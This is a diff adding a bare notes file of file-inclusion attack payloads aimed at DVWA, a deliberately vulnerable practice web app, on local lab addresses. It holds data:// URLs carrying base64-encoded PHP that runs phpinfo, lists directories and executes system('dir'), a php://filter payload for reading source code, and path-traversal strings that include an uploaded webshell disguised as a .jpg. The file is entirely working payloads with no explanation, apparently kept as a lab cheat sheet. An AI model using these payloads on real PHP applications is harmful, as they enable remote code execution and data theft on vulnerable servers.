@@ -1,0 +1,26 @@
+http://192.168.0.104/dvwa/vulnerabilities/fi/?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
+
+
+
+http://192.168.0.105/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=file1.php
+
+php://filter/convert.base64-encode/resource=FILE
+
+
+http://192.168.0.106/dvwa/vulnerabilities/fi/?page=data://text/plain;base64,PD9waHAgJGE9c2NhbmRpcigiLi8iKTtwcmludF9yKCRhKTsgPz4=
+
+
+
+<?php system("dir"); ?>		PD9waHAgc3lzdGVtKCJkaXIiKTsgPz4K
+
+http://192.168.0.106/dvwa/vulnerabilities/fi/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCJkaXIiKTsgPz4K
+
+
+C:\xampp\htdocs\dvwa\vulnerabilities\fi
+
+
+.\..\..\hackable\uploads\webshell.jpg%23webshell 
+
+./../../hackable/uploads/webshell.jpg%23webshell
+
+
